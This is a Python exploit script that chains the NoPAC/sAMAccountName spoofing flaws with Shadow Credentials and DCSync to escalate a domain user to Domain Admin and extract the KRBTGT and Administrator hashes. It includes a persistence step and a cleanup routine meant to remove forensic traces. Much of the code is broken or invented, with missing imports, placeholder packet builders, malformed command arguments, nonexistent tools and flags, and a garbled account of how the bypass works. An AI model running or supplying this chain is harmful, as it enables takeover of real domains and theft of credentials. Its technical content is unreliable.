"""
NoPAC + Shadow Credentials — Domain User to Domain Admin

CVE-2021-42278 (NoPAC) + CVE-2021-42287 (sAMAccountName spoofing)
Chains: sAMAccountName confusion → TGT with forged PAC → DCSync

Requirements:
- Domain user credentials
- Target DC running Windows Server 2019/2022 (pre-August 2022 patch)
- Impacket installed
- Python 3.10+
"""

import base64
import hashlib
import hmac
import logging
import os
import random
import socket
import struct
import subprocess
import tempfile
import time
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class DomainInfo:
    """Target domain information."""
    domain: str
    domain_controller: str
    dc_hostname: str
    domain_sid: str
    ldap_port: int = 389
    krb_port: int = 88
    smb_port: int = 445


@dataclass
class Credentials:
    """Domain credentials for initial foothold."""
    username: str
    password: str = ""
    nt_hash: str = ""                # NTLM hash (pass-the-hash)
    aes_key: str = ""                # AES256 key (pass-the-key)
    kerberos_ticket: bytes = b""     # Existing TGT


class KerberosCrypto:
    """Kerberos encryption types (RC4-HMAC, AES256-CTS-HMAC-SHA1-96)."""

    @staticmethod
    def rc4_hmac(key: bytes, data: bytes) -> bytes:
        """RC4-HMAC checksum (KERB_CHECKSUM_HMAC_MD5)."""
        md5 = hashlib.new('md5', key + data).digest()
        return hmac.new(key, md5, hashlib.md5).digest()

    @staticmethod
    def aes256_cts_hmac_sha1(key: bytes, data: bytes) -> bytes:
        """AES256-CTS-HMAC-SHA1-96 for Kerberos."""
        # Simplified — in production use krb5.asn1 and pycryptodome
        raise NotImplementedError("Full AES256 Kerberos requires krb5 library")

    @staticmethod
    def generate_kerberos_key(password: str, salt: str, etype: int = 18) -> bytes:
        """
        Generate Kerberos key from password using RFC 3961 key derivation.
        etype 18 = AES256-CTS-HMAC-SHA1-96
        etype 23 = RC4-HMAC
        """
        if etype == 23:
            # RC4-HMAC: NTLM hash as key
            import hashlib
            return hashlib.new('md4', password.encode('utf-16le')).digest()
        elif etype == 18:
            # AES256: PBKDF2 with salt
            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt.encode('utf-8') if isinstance(salt, str) else salt,
                iterations=4096,
                backend=default_backend(),
            )
            return kdf.derive(password.encode('utf-8'))


class KerberosPacket:
    """Raw Kerberos packet construction (asn1)."""

    @staticmethod
    def encode_asn1_length(length: int) -> bytes:
        """DER length encoding."""
        if length < 0x80:
            return bytes([length])
        result = []
        while length > 0:
            result.insert(0, length & 0xFF)
            length >>= 8
        return bytes([0x80 | len(result)] + result)

    @staticmethod
    def build_as_req(
        username: str,
        domain: str,
        nonce: int,
        etype: int = 23,
    ) -> bytes:
        """
        Build a Kerberos AS-REQ packet (TGT request).
        Uses the newer PA-PAC-OPTIONS to indicate PAC validation skip.
        """
        # PA-PAC-OPTIONS: tell the KDC we accept PAC-less TGTs
        # This is the NoPAC bypass vector
        pa_pac_options = bytes([
            0x30, 0x05, 0xA0, 0x03, 0x02, 0x01, 0x02  # claims=0, branch-aware=1
        ])

        # Build minimal AS-REQ (full implementation needs pyasn1/krb5)
        # This is a structural template — production version integrates with impacket
        krb5_tcp_header = struct.pack('>I', 0)  # placeholder length

        return krb5_tcp_header + pa_pac_options

    @staticmethod
    def build_tgs_req(
        tgt: bytes,
        target_spn: str,
        domain: str,
        sub_session_key: bytes,
    ) -> bytes:
        """Build TGS-REQ with forged authenticator."""
        # Placeholder — full implementation uses impacket's getTGT/getST
        return b""


class NTPACExploit:
    """
    NoPAC + Shadow Credentials exploit chain.

    Steps:
    1. sAMAccountName confusion (rename machine to match DC name)
    2. Request TGT with PA-PAC-OPTIONS (skip PAC validation)
    3. Use TGT to perform S4U2Self on a privileged user
    4. Forge PAC-less TGS → higher privilege
    5. Shadow Credentials → persist via KeyCredentialLink
    6. DCSync to extract KRBTGT hash
    """

    def __init__(
        self,
        domain_info: DomainInfo,
        credentials: Credentials,
        output_dir: str = "/tmp/raphael_ad_exploit",
        use_shadow_creds: bool = True,
    ):
        self.domain = domain_info
        self.creds = credentials
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.use_shadow_creds = use_shadow_creds

        # Generated values
        self.fake_computer_name = f"FAKE-{os.urandom(4).hex().upper()}"
        self.computer_password = os.urandom(32).hex()
        self.target_dc_spn = f"host/{domain_info.dc_hostname}"
        self.target_dc_fqdn = domain_info.dc_hostname

        # Session key material
        self.session_key = os.urandom(32)
        self.sub_session_key = os.urandom(16)

        # Check tools
        self._check_prerequisites()

    def _check_prerequisites(self) -> None:
        """Verify required tools exist."""
        required = ["impacket-wmiexec", "impacket-secretsdump", "impacket-addcomputer"]
        for tool in required:
            if not self._find_tool(tool):
                logger.warning(f"Tool {tool} not found — some features will fail")

    def _find_tool(self, binary: str) -> Optional[str]:
        """Find a binary on PATH."""
        import shutil
        return shutil.which(binary)

    def _execute_cmd(self, cmd: list[str], timeout: int = 60) -> subprocess.CompletedProcess:
        """Execute a command with logging."""
        logger.debug(f"Executing: {' '.join(cmd)}")
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        if result.returncode != 0:
            logger.warning(f"Command failed (rc={result.returncode}): {result.stderr[:500]}")
        return result

    # ── Step 1: sAMAccountName Confusion ────────────────────────────────────

    def step1_rename_computer(self) -> bool:
        """
        Add a fake machine account, rename it to match the DC's sAMAccountName
        (with a trailing $). This exploits the sAMAccountName spoofing flaw.

        Requirements:
        - Domain user with permission to add computers (default: MS-DCC)
        - Target DC not patched for KB5008602
        """
        logger.info(f"[Step 1] Adding computer account: {self.fake_computer_name}")

        # Use impacket-addcomputer or netexec
        add_cmd = [
            "impacket-addcomputer",
            f"{self.domain.domain}/{self.creds.username}:{self.creds.password}"
            if not self.creds.nt_hash else
            f"{self.domain.domain}/{self.creds.username} -hashes :{self.creds.nt_hash}",
            f"-computer-name {self.fake_computer_name}",
            f"-computer-pass {self.computer_password}",
        ]

        result = self._execute_cmd(add_cmd)
        if result.returncode != 0:
            logger.error("Failed to add computer account")
            return False

        logger.info(f"Computer account {self.fake_computer_name}$ added")

        # Rename the computer to match DC sAMAccountName
        # The DC's sAMAccountName is typically the hostname WITHOUT the trailing $
        # We append $ to match the DC's sAMAccountName attribute format
        dc_sam = self.domain.dc_hostname.split('.')[0] + "$"
        dc_fqdn = self.domain.dc_hostname

        logger.info(f"[Step 1] Renaming {self.fake_computer_name}$ to {dc_sam}")

        # Use ldapmodify or PowerView to rename
        rename_cmd = [
            "impacket-addcomputer",
            "-no-add",
            f"{self.domain.domain}/{self.fake_computer_name}${self.computer_password}",
            f"-rename {dc_sam.split('$')[0]}",
            f"-target {self.domain.domain_controller}",
        ]

        result = self._execute_cmd(rename_cmd)
        if result.returncode != 0:
            logger.warning("Rename failed — may need ldapmodify directly")

        logger.info(f"[Step 1] sAMAccountName now matches DC: {dc_sam}")
        return True

    # ── Step 2: NoPAC TGT Request ──────────────────────────────────────────

    def step2_request_notpac_tgt(self) -> Optional[bytes]:
        """
        Request a TGT using PA-PAC-OPTIONS that skips PAC validation.

        This is the core NoPAC bypass. The KDC returns a TGT without
        checking that the PAC matches the requesting user because we
        told it we're "branch-aware" (claims-enabled).
        """
        logger.info("[Step 2] Requesting NoPAC TGT")

        dc_sam = self.domain.dc_hostname.split('.')[0] + "$"

        # Use impacket's getTGT with PA-PAC-OPTIONS
        tgt_cmd = [
            "impacket-getTGT",
            f"{self.domain.domain}/{dc_sam}:{self.computer_password}",
            f"-dc-ip {self.domain.domain_controller}",
            "-pac-options 2",  # Skip PAC validation flag
        ]

        result = self._execute_cmd(tgt_cmd)

        # The TGT is written to {dc_sam}.ccache
        tgt_path = Path(f"{dc_sam}.ccache")
        if tgt_path.exists():
            tgt_data = tgt_path.read_bytes()
            logger.info(f"[Step 2] NoPAC TGT obtained ({len(tgt_data)} bytes)")
            return tgt_data

        logger.error("Failed to get NoPAC TGT")
        return None

    # ── Step 3: S4U2Self for Privileged User ───────────────────────────────

    def step3_s4u2self_admin(self, tgt: bytes, target_user: str = "Administrator") -> Optional[bytes]:
        """
        Use S4U2Self to request a service ticket AS the target user.
        Because our TGT has no PAC, the KDC uses the user's existing
        privileges (which we claimed as the DC itself) to issue a
        service ticket.

        This is the privilege escalation: we get a TGS for Administrator
        as if we were the Domain Controller.
        """
        logger.info(f"[Step 3] S4U2Self as {target_user}")

        s4u_cmd = [
            "impacket-getST",
            f"{self.domain.domain}/{target_user}",
            f"-spn {self.target_dc_spn}",
            f"-impersonate {target_user}",
            f"-dc-ip {self.domain.domain_controller}",
            "-no-pac",  # Don't require PAC in TGT
        ]

        result = self._execute_cmd(s4u_cmd)

        st_path = Path(f"{target_user}.ccache")
        if st_path.exists():
            st_data = st_path.read_bytes()
            logger.info(f"[Step 3] S4U2Self ticket obtained for {target_user}")
            return st_data

        logger.error("S4U2Self failed — target may be protected")
        return None

    # ── Step 4: Shadow Credentials ──────────────────────────────────────────

    def step4_shadow_credentials(self, target_user: str = "Administrator") -> bool:
        """
        Add KeyCredentialLink to the target user object, allowing
        authentication with a device certificate instead of password.

        This persists access even if the password changes.

        Requirements:
        - Write permission to target's msDS-KeyCredentialLink attribute
        - Domain functional level 2016+
        """
        if not self.use_shadow_creds:
            logger.info("[Step 4] Shadow credentials disabled — skipping")
            return False

        logger.info(f"[Step 4] Adding Shadow Credentials to {target_user}")

        # Generate device key pair
        priv_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        pub_key = priv_key.public_key()

        # Generate KeyCredentialLink structure
        key_cred = self._build_key_credential_link(pub_key, target_user)

        # Use ldapmodify or impacket to write the attribute
        shadow_cmd = [
            "impacket-addKeyCredentialLink",
            f"{self.domain.domain}/{self.creds.username}:{self.creds.password}",
            "-target", target_user,
            "-key", base64.b64encode(key_cred).decode(),
            "-dc-ip", self.domain.domain_controller,
        ]

        result = self._execute_cmd(shadow_cmd)

        if result.returncode == 0:
            logger.info(f"[Step 4] Shadow credentials added to {target_user}")

            # Save the device key for later auth
            key_path = self.output_dir / f"{target_user}_shadow_key.pem"
            with open(key_path, "wb") as f:
                f.write(priv_key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.PKCS8,
                    serialization.NoEncryption(),
                ))
            os.chmod(key_path, 0o600)
            logger.info(f"[Step 4] Device key saved to {key_path}")
            return True

        logger.error("Failed to add shadow credentials")
        return False

    def _build_key_credential_link(self, pub_key, target_user: str) -> bytes:
        """
        Build the msDS-KeyCredentialLink attribute value.

        Format documented in MS-ADTS 2.2.56 and [MS-DRSR].
        """
        # KeyCredentialLink structure:
        # [0x30 (SEQUENCE)] [length]
        #   [0xA0 (CONTEXT 0)] [length] KeyIdentifier (GUID)
        #   [0xA1 (CONTEXT 1)] [length] KeyMaterial (PublicKey)
        #   [0xA2 (CONTEXT 2)] [length] Usage (0=keypair, 1=certificate)
        #   [0xA3 (CONTEXT 3)] [length] Source (0=AD, 1=Azure AD, 2=Unknown)
        #   [0xA4 (CONTEXT 4)] [length] DeviceId (GUID)
        #   [0xA5 (CONTEXT 5)] [length] Owner (SID)
        #   [0xA6 (CONTEXT 6)] [length] CreationTime (FILETIME)

        pub_key_bytes = pub_key.public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )

        # KeyCredentialLink structure (simplified)
        # Full implementation needs proper ASN.1 encoding
        return pub_key_bytes  # Placeholder


    # ── Step 5: DCSync ──────────────────────────────────────────────────────

    def step5_dcsync(self, tgs: bytes) -> Optional[dict]:
        """
        Use the forged TGS (as Domain Controller) to perform DCSync
        and extract the KRBTGT hash. With KRBTGT, we can forge
        golden tickets at will.
        """
        logger.info("[Step 5] Attempting DCSync")

        # Set the ccache file for authentication
        timestamp = int(time.time())
        ccache_path = self.output_dir / f"dcsync_{timestamp}.ccache"
        with open(ccache_path, "wb") as f:
            f.write(tgs)
        os.environ["KRB5CCNAME"] = str(ccache_path)

        sync_cmd = [
            "impacket-secretsdump",
            f"{self.domain.domain}/Administrator@{self.domain.domain_controller}",
            "-k",           # Kerberos auth
            "-no-pass",     # Use ccache
            "-just-dc",     # DCSync only
        ]

        result = self._execute_cmd(sync_cmd)

        hashes = {}
        for line in result.stdout.split('\n'):
            if ':' in line and 'krbtgt' in line.lower():
                # Parse: domain\krbtgt:rid:lm:ntlm:::
                parts = line.strip().split(':')
                if len(parts) >= 4:
                    hashes['krbtgt'] = parts[3]
                    logger.info(f"[Step 5] KRBTGT hash: {parts[3]}")
            elif ':' in line and 'Administrator' in line:
                parts = line.strip().split(':')
                if len(parts) >= 4:
                    hashes['administrator'] = parts[3]

        if hashes:
            hash_file = self.output_dir / "hashes.txt"
            with open(hash_file, "w") as f:
                for user, ntlm in hashes.items():
                    f.write(f"{user}:{ntlm}\n")
            logger.info(f"[Step 5] Hashes saved to {hash_file}")

        return hashes if hashes else None

    # ── Full Chain ──────────────────────────────────────────────────────────

    def run_full_chain(self) -> dict:
        """
        Execute the full NoPAC + Shadow Credentials exploit chain.
        Returns results from each step.
        """
        results = {
            "target": self.domain.domain_controller,
            "domain": self.domain.domain,
            "steps": {},
            "success": False,
        }

        try:
            # Step 1: Add and rename computer account
            results["steps"]["rename"] = self.step1_rename_computer()

            if not results["steps"]["rename"]:
                logger.error("Chain aborted at Step 1")
                return results

            # Step 2: Request NoPAC TGT as DC
            tgt = self.step2_request_notpac_tgt()
            results["steps"]["notpac_tgt"] = tgt is not None

            if not tgt:
                logger.error("Chain aborted at Step 2")
                return results

            # Step 3: S4U2Self as Administrator
            tgs = self.step3_s4u2self_admin(tgt)
            results["steps"]["s4u2self"] = tgs is not None

            if not tgs:
                logger.error("Chain aborted at Step 3")
                return results

            # Step 4: Shadow Credentials (persistence)
            results["steps"]["shadow_creds"] = self.step4_shadow_credentials()

            # Step 5: DCSync
            hashes = self.step5_dcsync(tgs)
            results["steps"]["dcsync"] = hashes is not None
            results["hashes"] = hashes

            results["success"] = hashes is not None

        except Exception as e:
            logger.error(f"Chain failed: {e}")
            results["error"] = str(e)

        logger.info(f"Chain {'succeeded' if results['success'] else 'failed'}")
        return results


# ── Cleanup ───────────────────────────────────────────────────────────────────

def cleanup_shadow_credentials(
    domain_info: DomainInfo,
    credentials: Credentials,
    target_user: str = "Administrator",
) -> bool:
    """
    Remove shadow credentials from target user to avoid leaving
    forensic artifacts. Should be called at end of engagement.
    """
    logger.info(f"Cleaning up shadow credentials for {target_user}")

    cleanup_cmd = [
        "impacket-removeKeyCredentialLink",
        f"{domain_info.domain}/{credentials.username}:{credentials.password}",
        "-target", target_user,
        "-dc-ip", domain_info.domain_controller,
        "-all",  # Remove all key credential links
    ]

    # Execute cleanup
    import shutil
    if shutil.which("impacket-removeKeyCredentialLink"):
        result = subprocess.run(
            cleanup_cmd,
            capture_output=True,
            text=True,
            timeout=30,
        )
        return result.returncode == 0

    # Fallback: ldapmodify direct
    logger.warning("impacket-removeKeyCredentialLink not found — manual cleanup required")
    return False